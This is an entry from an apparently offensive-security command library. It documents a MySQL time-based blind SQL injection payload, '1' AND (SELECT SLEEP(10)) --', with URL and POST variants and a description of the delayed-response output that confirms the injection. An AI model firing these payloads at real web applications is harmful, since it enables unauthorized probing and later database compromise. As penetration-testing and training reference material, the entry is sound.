---
id: 2939b844-d122-4b8f-860c-69f23ff6603a
name: mysql-confirm-time-delay-injection
type: command
executor: sql
data: 1' AND (SELECT SLEEP(10)) --
output: null
created_at: '2023-04-06T03:56:34.688843+00:00'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Web
  - Linux
tags:
  - sql-injection
  - time-based
verified: true
validated: true
---

# mysql-confirm-time-delay-injection

## Command

```sql
1' AND (SELECT SLEEP(10)) --
```

## Description

This command injects a basic time-delay payload into a vulnerable SQL parameter to confirm blind injection capability in MySQL. It uses a subselect with SLEEP to pause execution if injected successfully, detectable via response timing.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `1'` | String closure to break out of original query | Yes |
| `(SELECT SLEEP(10))` | Subselect causing 10-second delay on true condition | Yes |
| `--` | SQL comment to ignore trailing query | Yes |

## Examples

### Basic Usage

Inject into a URL parameter:
```sql
?id=1' AND (SELECT SLEEP(10)) --
```

### Advanced Usage

For POST data or adjusted syntax:
```sql
username=admin' AND (SELECT SLEEP(10) FROM DUAL) #
```
(Use # for MySQL comment if -- causes issues.)

## Expected Output

No visible data output, but the HTTP response time increases by approximately 10 seconds, confirming injection control. Normal responses take <1 second; use a proxy to measure precisely.

## Related

- [[procedures/mysql-time-based-blind-injection-using-sleep-subselect]]
- [[codes/mysql-sleep-subselect-extraction-payloads]]
